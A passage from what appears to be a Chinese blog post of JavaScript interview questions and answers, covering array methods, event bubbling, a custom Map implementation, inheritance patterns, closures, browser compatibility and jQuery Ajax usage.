赋值一样；</li><li>返回新数组长度</li><li>操作原数组，末尾追加</li></ul></li><li>pop();<ul><li>删除数组中最后一个元素，</li><li>返回值是被删除的这个元素</li><li>操作原数组</li></ul></li><li>shift();<ul><li>删除数组中的第一个元素，</li><li>返回值是被删除的元素</li></ul></li><li>unshift();<ul><li>向数组中第一个元素之前插入一个或多个新的元素</li><li>返回值是新数组的长度</li></ul></li><li>concat(); Array.concat() 方法创建并返回新数组<ul><li>新的数组和旧的数组拼接，产生一个新的数组</li><li>不修改原数组</li></ul></li><li>slice(); Array.slice()方法返回指定数组的一个片段或子数组<ul><li>两个参数： 开始索引，结束索引，返回包含开始索引，不包含结束索引位置之间的所有数组元素；</li><li>指定一个参数，返回包含开始位置到数组结尾的所有元素</li><li>参数是负数，相对于最后一个位置的。如参数 -1 指定了最后一个元素，-2 是倒数第二个</li><li>从原来的数组中截取出来指定的一部分元素，产生新的数组</li><li>不操作原数组</li></ul></li><li>splice(); Array.splice()是数组中插入或删除元素的方法。<ul><li>会修改调用数组，</li><li>第一个参数是开始的下标,第二个参数是指定了删除原数组元素的个数；</li><li>如果省略了第二个参数，从开始索引位置后的元素都被删除；</li><li>可以有第三个参数，第四个参数…跟在第二个参数后的任意多个参数是需要插入原数组中的元素，从第一个参数指定的索引位置插入；</li><li>该方法返回的是删除元素组成的数组,如果没有替换则返回空数组。</li></ul></li><li>join(); 将数组中的所有元素都转化成字符串并连接到一起<ul><li>返回最终生成的字符串</li><li>是 String.split() 方法的逆向操作。String.split() 是将字符串分隔成分隔，返回数组；</li></ul></li><li>reverse();<ul><li>反转数组</li><li>操作原数组</li><li>返回操作后的逆向数组</li></ul></li><li>sort(); Array.sort() 方法将数组中的元素排序并返回排序后的数组<ul><li>操作原数组；</li><li>返回排序后的数组</li></ul></li><li>toString()<ul><li>和不使用任何参数调用 join() 方法返回的字符串是一样的。</li></ul></li><li>toLocalString() 方法是 toString() 方法的本地化版本，使用本地    化分隔符将这些字符串连接起来生成最终字符串。</li><li>indexOf()和lastIndexOf(); 搜索整个数组中具有给定值的元素<ul><li>查找某个元素，</li><li>第一个参数是要查找的元素,</li><li>第二个参数是开始查找的下标,</li><li>找到则返回找到的第一个元素的索引，找不到则返回-1</li></ul></li><li>lastIndexOf();<ul><li>这个方法也是查找元素,从后面向前面找,找到则返回对应的下标,找不到则返回-1；</li><li>第二个元素可以是负数，代表相对数组末尾的偏移量；</li></ul></li><li>every() 和 some(); 数组的逻辑判定，传入一个函数,判断每个数组中的元素是否满足条件；<ul><li>every() 方法针对所有的元素判断调用函数返回全为 true，则返回true；</li><li>every() 方法有一个不满足条件的则返回 false</li><li>some() 方法所有的元素判断调用函数有一个满足条件的则返回 true</li><li>some() 方法全为 false, 则返回 false</li></ul></li><li>map() 方法，将调用的数组的每个元素传递给指定的函数，并返回一个  包含该函数的数组。<ul><li>返回新数组</li><li>不修改原数组</li><li>稀疏数组调用返回的还是稀疏数组<ul><li>一个例子：arr.map(Math.sqrt);<ul><li>map这个方法可以传入一个回调函数,</li><li>直接传入了一个Math.sqrt方法,sqrt方法是为某个数字开平方的</li><li>调用map方法传入Math.sqrt的时候,去掉了括号,也没有传入参数</li><li>map方法内部帮我们遍历并且传入数组的每个元素</li></ul></li></ul></li></ul></li><li>filter() 方法，返回的是调用的数组的一个子集，传递的回调函数用来逻辑判断，该函数的返回值是布尔值；<ul><li>压缩空缺或并删除 undefined 和 null 元素，也可以使用 filter();</li></ul></li><li>instanceof</li><li>isArray(); ECMAScript 5 中给出的检测数组类型的方法；<ul><li>这个方法是判断变量是不是数组</li></ul></li><li>forEach 方法，从头至尾遍历数组，为每个元素调用指定的函数；<ul><li>三个参数，数值元素、数组索引、数组本身</li><li>无法再所有元素传递完调用函数之前终止遍历</li></ul></li><li>reduce()和 reduceRight()<ul><li>reduce() 和 reduceRight() 方法使用指定的函数将数组元素进行组合，生成单个值。</li><li>reduce() 两个参数：<ul><li>第一个是执行简化操作的函数。化简函数的任务就是用某种方法把两个值组合和化简为一个值，并返回简化后的值。</li><li>第二个参数是可选参数</li></ul></li><li>reduceRight() 的工作原理和 reduce() 一样，不同的是它按照数组索引从高到低处理数组；</li></ul></li></ul><h2 id="ECMAScript-6-中数组新方法"><a href="#ECMAScript-6-中数组新方法" class="headerlink" title="ECMAScript 6 中数组新方法"></a>ECMAScript 6 中数组新方法</h2><ul><li>Array.prototype.find 方法用于找出第一个符合条件的数组成员。<ul><li>参数是一个回调函数，找到第一个返回 true 的数组项，然后返回该数组项；</li><li>找不到返回undefined；</li></ul></li><li>两个静态方法<ul><li>Array.from<ul><li>将一个伪数组转成正真的数组</li></ul></li><li>Array.of<ul><li>将方法中参数都添加到一个数组中</li></ul></li></ul></li><li>操作、填充和过滤数组的方法<ul><li>Array.prototype.copyWidthin</li><li>Array.prototype.fill</li><li>Array.prototype.find<ul><li>接收一个回调函数，每一项执行调用它</li></ul></li><li>Array.prototype.findIndex</li></ul></li><li>有关数组迭代的方法<ul><li>Array.prototype.keys</li><li>Array.prototype.values</li><li>Array.prototype.entries</li><li>Array.prototype[Symbol.iterator]</li></ul></li></ul><h2 id="FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素"><a href="#FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素" class="headerlink" title="FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素"></a>FF与IE中如何阻止事件冒泡，如何获取事件对象，以及如何获取触发事件的元素</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stopPropagation</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">  e = e || <span class="built_in">window</span>.event;  </span><br><span class="line">  <span class="keyword">if</span>(e.stopPropagation) &#123; <span class="comment">//W3C阻止冒泡方法  </span></span><br><span class="line">    e.stopPropagation();  </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    e.cancelBubble = <span class="literal">true</span>; <span class="comment">//IE阻止冒泡方法  </span></span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'need_hide'</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">  stopPropagation(e);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="列举常用的js框架以及分别适用的领域"><a href="#列举常用的js框架以及分别适用的领域" class="headerlink" title="列举常用的js框架以及分别适用的领域"></a>列举常用的js框架以及分别适用的领域</h2><p>jQuery 库 DOM 操作<br>Bootstrap 是 UI 组件，响应式布局<br>Angular 框架单页应用程序 SPA</p><p>库的特点</p><ul><li>选择器（Selector）</li><li>DOM 遍历</li><li>DOM 操作</li><li>实用（Utility）函数</li><li>事件处理</li><li>Ajax</li></ul><h2 id="js中如何实现一个map"><a href="#js中如何实现一个map" class="headerlink" title="js中如何实现一个map"></a>js中如何实现一个map</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html &gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;无标题文档&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;script language="javascript"&gt;</span></span><br><span class="line"><span class="regexp">  Array.prototype.remove = function(s) &#123;</span></span><br><span class="line"><span class="regexp">    for (var i = 0; i &lt; this.length; i++) &#123;</span></span><br><span class="line"><span class="regexp">      if (s == this[i]) this.splice(i, 1);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  function Map() &#123;</span></span><br><span class="line"><span class="regexp">    /</span>** 存放键的数组(遍历用到) *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    this.keys = new Array();</span></span><br><span class="line"><span class="regexp">    /</span>** 存放数据 *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    this.data = new Object();</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 放入一个键值对</span></span><br><span class="line"><span class="regexp">    this.put = function(key, value) &#123;</span></span><br><span class="line"><span class="regexp">      if(this.data[key] == null)&#123;</span></span><br><span class="line"><span class="regexp">        this.keys.push(key);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      this.data[key] = value;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取某键对应的值</span></span><br><span class="line"><span class="regexp">    this.get = function(key) &#123;</span></span><br><span class="line"><span class="regexp">      return this.data[key];</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 删除一个键值对</span></span><br><span class="line"><span class="regexp">    this.remove = function(key) &#123;</span></span><br><span class="line"><span class="regexp">      this.keys.remove(key);</span></span><br><span class="line"><span class="regexp">      this.data[key] = null;</span></span><br><span class="line"><span class="regexp">    &#125;; </span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 遍历Map,执行处理函数</span></span><br><span class="line"><span class="regexp">    this.each = function(fn)&#123;</span></span><br><span class="line"><span class="regexp">      if(typeof fn != 'function')&#123;</span></span><br><span class="line"><span class="regexp">          return;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      var len = this.keys.length;</span></span><br><span class="line"><span class="regexp">      for(var i=0;i&lt;len;i++)&#123;</span></span><br><span class="line"><span class="regexp">        var k = this.keys[i];</span></span><br><span class="line"><span class="regexp">        fn(k,this.data[k],i);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取键值数组(类似Java的entrySet())</span></span><br><span class="line"><span class="regexp">    this.entrys = function() &#123;</span></span><br><span class="line"><span class="regexp">      var len = this.keys.length;</span></span><br><span class="line"><span class="regexp">      var entrys = new Array(len);</span></span><br><span class="line"><span class="regexp">      for (var i = 0; i &lt; len; i++) &#123;</span></span><br><span class="line"><span class="regexp">        entrys[i] = &#123;</span></span><br><span class="line"><span class="regexp">          key : this.keys[i],</span></span><br><span class="line"><span class="regexp">          value : this.data[i]</span></span><br><span class="line"><span class="regexp">        &#125;;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      return entrys;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 判断Map是否为空</span></span><br><span class="line"><span class="regexp">    this.isEmpty = function() &#123;</span></span><br><span class="line"><span class="regexp">        return this.keys.length == 0;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取键值对数量</span></span><br><span class="line"><span class="regexp">    this.size = function()&#123;</span></span><br><span class="line"><span class="regexp">      return this.keys.length;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 重写toString </span></span><br><span class="line"><span class="regexp">    this.toString = function()&#123;</span></span><br><span class="line"><span class="regexp">      var s = "&#123;";</span></span><br><span class="line"><span class="regexp">      for(var i=0;i&lt;this.keys.length;i++,s+=',')&#123;</span></span><br><span class="line"><span class="regexp">        var k = this.keys[i];</span></span><br><span class="line"><span class="regexp">        s += k+"="+this.data[k];</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      s+="&#125;";</span></span><br><span class="line"><span class="regexp">      return s;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  function testMap()&#123;</span></span><br><span class="line"><span class="regexp">    var m = new Map();</span></span><br><span class="line"><span class="regexp">    m.put('key1','Comtop');</span></span><br><span class="line"><span class="regexp">    m.put('key2','南方电网');</span></span><br><span class="line"><span class="regexp">    m.put('key3','景新花园');</span></span><br><span class="line"><span class="regexp">    alert("init:"+m);  </span></span><br><span class="line"><span class="regexp">    m.put('key1','康拓普');</span></span><br><span class="line"><span class="regexp">    alert("set key1:"+m);</span></span><br><span class="line"><span class="regexp">    m.remove("key2");</span></span><br><span class="line"><span class="regexp">    alert("remove key2: "+m);</span></span><br><span class="line"><span class="regexp">    var s ="";</span></span><br><span class="line"><span class="regexp">    m.each(function(key,value,index)&#123;</span></span><br><span class="line"><span class="regexp">        s += index+":"+ key+"="+value+"\n";</span></span><br><span class="line"><span class="regexp">    &#125;);</span></span><br><span class="line"><span class="regexp">    alert(s);</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">  &lt;body onload="testMap()"&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/angel_he/article/details/47613743" target="_blank" rel="noopener">用js写一个实现map</a></p><h2 id="js可否实现面向对象编程，如果可以如何实现js对象的继承"><a href="#js可否实现面向对象编程，如果可以如何实现js对象的继承" class="headerlink" title="js可否实现面向对象编程，如果可以如何实现js对象的继承"></a>js可否实现面向对象编程，如果可以如何实现js对象的继承</h2><blockquote><p>扩展原型对象实现继承<br>替换原型对象实现继承<br>另一种原型继承（动态原型模式） 特点：让代码封装到一起<br>混入继承： 已知两个对象，一个对象继承另一个对象的功能，for..in, jQuery的extend()方法原理是混入继承<br>原型+混入继承：混入继承的应用, 在一个对象的原型对象上扩展另一个对象的属性和方法, jQuery.fn.extend() 利用的原理是原型+混入继承<br>经典继承：已知一个对象knownObj，需要创建一个新对象，这个新对象继承自已知的对象knownObj,ES5 Object.create()方法的实现原理就是经典继承<br>借用构造函数实现继承<br>混合继承（经典继承+借用构造函数） 解决借用构造函数继承不能够继承原型对象上的方法的问题; 继承了两次构造函数（模板）<br>混合继承（经典继承+借用构造函数）</p></blockquote><h2 id="变量的命名规范以及命名推荐"><a href="#变量的命名规范以及命名推荐" class="headerlink" title="变量的命名规范以及命名推荐"></a>变量的命名规范以及命名推荐</h2><blockquote><p>变量，函数，方法：小写开头，以后的每个单词首字母大写 （驼峰）<br>构造函数，class：每个单词大写开头<br>基于实际情况，以动词，名词，谓词来命名。尽量言简意骇，以命名代替注释</p></blockquote><h2 id="三种弹窗的单词以及三种弹窗的功能"><a href="#三种弹窗的单词以及三种弹窗的功能" class="headerlink" title="三种弹窗的单词以及三种弹窗的功能"></a>三种弹窗的单词以及三种弹窗的功能</h2><p>1) alert</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//弹出对话框并输出一段提示信息  </span><br><span class="line">  function ale() &#123;  </span><br><span class="line">    //弹出一个对话框  </span><br><span class="line">    alert(&quot;提示信息！&quot;);  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>2) confirm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//弹出一个询问框，有确定和取消按钮  </span><br><span class="line">function firm() &#123;  </span><br><span class="line">  //利用对话框返回的值 （true 或者 false）  </span><br><span class="line">  if (confirm(&quot;你确定提交吗？&quot;)) &#123;  </span><br><span class="line">    alert(&quot;点击了确定&quot;);  </span><br><span class="line">  &#125;  </span><br><span class="line">  else &#123;  </span><br><span class="line">    alert(&quot;点击了取消&quot;);  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3) prompt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//弹出一个输入框，输入一段文字，可以提交  </span><br><span class="line">function prom() &#123;  </span><br><span class="line">  var name = prompt(&quot;请输入您的名字&quot;, &quot;&quot;); //将输入的内容赋给变量 name ，  </span><br><span class="line">  //这里需要注意的是，prompt有两个参数，前面是提示的话，后面是当对话框出来后，在对话框里的默认值  </span><br><span class="line">  if (name)//如果返回的有内容  </span><br><span class="line">  &#123;  </span><br><span class="line">    alert(&quot;欢迎您：&quot; + name)  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="输出值是"><a href="#输出值是" class="headerlink" title="输出值是"></a>输出值是</h2><blockquote><p>console.log( 8 | 1 ); // 9</p></blockquote><h2 id="求一个函数-y-f-x-a-b"><a href="#求一个函数-y-f-x-a-b" class="headerlink" title="求一个函数 y = f(x, a, b);"></a>求一个函数 y = f(x, a, b);</h2><p>只允许使用 + - / 和 Math.，当x &gt; 100 时返回 a 的值，否则返回 b 的值，不能使用 if else 等条件语句，也不能使用 |, ? :, 数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function f(x, a, b) &#123;</span><br><span class="line">  var temp = Math.ceil(Math.min(Math.max(x - 100, 0), 1));</span><br><span class="line">  return a * temp + b * (1 - temp);</span><br><span class="line">&#125;</span><br><span class="line">console.log(f(-10, 1, 2));</span><br></pre></td></tr></table></figure><h2 id="JavaScript-alert-0-4-0-2-结果是多少-如何处理"><a href="#JavaScript-alert-0-4-0-2-结果是多少-如何处理" class="headerlink" title="JavaScript alert(0.4*0.2); 结果是多少? 如何处理"></a>JavaScript alert(0.4*0.2); 结果是多少? 如何处理</h2><blockquote><p>有误差，应该比准确结果偏大。<br>一般我会将小数变为整数来处理。<br>当前之前遇到这个问题时也上网查询发现有人用try catch return写了一个函数，<br>当然原理也是一致先转为整数再计算。</p></blockquote><h2 id="一个div，有几种方式得到这个-div-的-jQuery-对象？"><a href="#一个div，有几种方式得到这个-div-的-jQuery-对象？" class="headerlink" title="一个div，有几种方式得到这个 div 的 jQuery 对象？"></a>一个div，有几种方式得到这个 div 的 jQuery 对象？</h2><p><code>&lt;div class=&#39;aabbcc&#39; id=&#39;nodesView&#39;&gt;&lt;/div&gt;</code></p><p>想直接获取这个div的dom对象，如何获取？dom对象如何转化为jQuery对象？</p><blockquote><p>$(“#nodesView”)<br>$(“.aabbcc”)<br>$(“#nodesView”)[0]<br>$(“.aabbcc”)[0]</p></blockquote><h2 id="jQuery-框架中-ajax-的常用参数有哪些"><a href="#jQuery-框架中-ajax-的常用参数有哪些" class="headerlink" title="jQuery 框架中 $.ajax()的常用参数有哪些"></a>jQuery 框架中 $.ajax()的常用参数有哪些</h2><p>写一个post请求并带有发送数据和返回数据的样例</p><blockquote><p>async是否异步<br>url请求地址<br>contentType发送信息至服务器时内容编码类型<br>data发送到服务器的数据<br>dataType预期服务器返回的数据类型<br>type请求类型<br>success请求成功回调函数<br>error请求失败回调函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">  url: &quot;/jquery/test1.txt&quot;,</span><br><span class="line">  type: &apos;post&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">      id: 1</span><br><span class="line">  &#125;,</span><br><span class="line">  success: function(data) &#123;</span><br><span class="line">    alert(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>下面这个ul，如何点击每一列的时候 alert 其 index</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=&quot;test&quot;&gt;</span><br><span class="line">  &lt;li&gt;这是第一条&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;这是第二条&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;这是第三条&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.onload = function() &#123;</span><br><span class="line">    var lis = document.getElementById(&apos;test&apos;).children;</span><br><span class="line">    for (var i = 0; i &lt; lis.length; i++) &#123;</span><br><span class="line">      lis[i].onclick = (function(i) &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">          alert(i)</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;)(i);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="列出3条以上-ff-和-IE-的脚本兼容问题"><a href="#列出3条以上-ff-和-IE-的脚本兼容问题" class="headerlink" title="列出3条以上 ff 和 IE 的脚本兼容问题"></a>列出3条以上 ff 和 IE 的脚本兼容问题</h2><p>(1) window.event：</p><blockquote><p>表示当前的事件对象，IE有这个对象，FF没有，FF通过给事件处理函数传递事件对象</p></blockquote><p>(2) 获取事件源</p><blockquote><p>IE用srcElement获取事件源，而FF用target获取事件源</p></blockquote><p>(3) 添加，去除事件</p><blockquote><p>IE：element.attachEvent(“onclick”, function) element.detachEvent(“onclick”, function)<br>FF：element.addEventListener(“click”, function, true) element.removeEventListener(“click”, function, true)</p></blockquote><p>(4) 获取标签的自定义属性</p><blockquote><p>IE：div1.value或div1[“value”]<br>FF：可用div1.getAttribute(“value”);</p></blockquote><h2 id="列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个"><a href="#列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个" class="headerlink" title="列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个"></a>列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个</h2><blockquote><p>对象：Window document location screen history navigator<br>方法：Alert() confirm() prompt() open() close()</p></blockquote><h2 id="在Javascript中什么是伪数组？如何将伪数组转化为标准数组？"><a href="#在Javascript中什么是伪数组？如何将伪数组转化为标准数组？" class="headerlink" title="在Javascript中什么是伪数组？如何将伪数组转化为标准数组？"></a>在Javascript中什么是伪数组？如何将伪数组转化为标准数组？</h2><blockquote><p>伪数组（类数组）：无法直接调用数组方法或期望length属性有什么特殊的行为，但仍可以对真正数组遍历方法来遍历它们。<br>典型的是函数的argument参数，还有像调用getElementsByTagName,document.childNodes之类的,它们都返回NodeList对象都属于伪数组。<br>可以使用Array.prototype.slice.call(fakeArray)将数组转化为真正的Array对象。</p></blockquote><h2 id="写一个函数可以计算-sum-5-0-5-输出0-sum-1-2-3-4-输出10"><a href="#写一个函数可以计算-sum-5-0-5-输出0-sum-1-2-3-4-输出10" class="headerlink" title="写一个函数可以计算 sum(5, 0, -5); 输出0; sum(1,2,3,4); 输出10;"></a>写一个函数可以计算 sum(5, 0, -5); 输出0; sum(1,2,3,4); 输出10;</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="built_in">arguments</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="built_in">arguments</span>[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> num==<span class="string">'number'</span>) &#123;</span><br><span class="line">      result += num;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>写出代码对下列数组去重并从大到小排列 {5,2,3,6,8,6,5,4,7,1,9}</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length<span class="number">-1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr.length<span class="number">-1</span>-i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j] &lt; arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">var</span> temp = arr[j];</span><br><span class="line">        arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">        arr[j+<span class="number">1</span>] = temp;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = arr[i];</span><br><span class="line">  